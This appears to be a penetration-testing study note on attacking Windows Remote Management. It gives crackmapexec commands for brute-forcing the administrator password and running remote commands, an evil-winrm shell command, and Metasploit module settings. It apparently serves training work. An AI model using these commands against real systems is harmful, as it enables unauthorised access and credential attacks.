# Exploiting WinRM

* Windows Remote Management (WinRM) is a Windows remote management protocol that can be used to facilitate remote access with Windows systems over HTTP(S).&#x20;
* Microsoft implemented WinRM in to Windows in order to make life easier for system administrators.&#x20;
* WinRM is typically used in the following ways:&#x20;
  * Remotely access and interact with Windows hosts on a local network.&#x20;
  * Remotely access and execute commands on Windows systems.&#x20;
  * Manage and configure Windows systems remotely.&#x20;
* WinRM typically uses TCP port 5985 and 5986 (HTTPS).
* We can utilize a utility called “crackmapexec” to perform a brute-force on WinRM in order to identify users and their passwords as well as execute commands on the target system.&#x20;
* We can also utilize a ruby script called “evil-winrm” to obtain a command shell session on the target system.

## Practical Demo

Enumerate the target

For WinRM you have to specify the ports,since they are not in the 1000  most common ports. 5985/5986

### Bruteforce with CrackMapExec

* <mark style="color:yellow;">crackmapexec winrm targetIP -u administrator -p pathtolist</mark>

After getting credentials to login and execute specific command run:

* <mark style="color:yellow;">crackmapexec winrm targetIP -u administrator -p tinkerbell -x commandtorun</mark>

### Obtain a command shell with Evil-Winrm

[https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)

* <mark style="color:yellow;">evil-winrm.rb -u administrator -p tinkerbell -i targetIP</mark>

### Metasploit Module

<mark style="color:red;">exploit/windows/winrm/winrm\_script\_exec</mark>

Set RHOSTS

Set USERNAME and PASSWORD

set FORCE\_VBS true













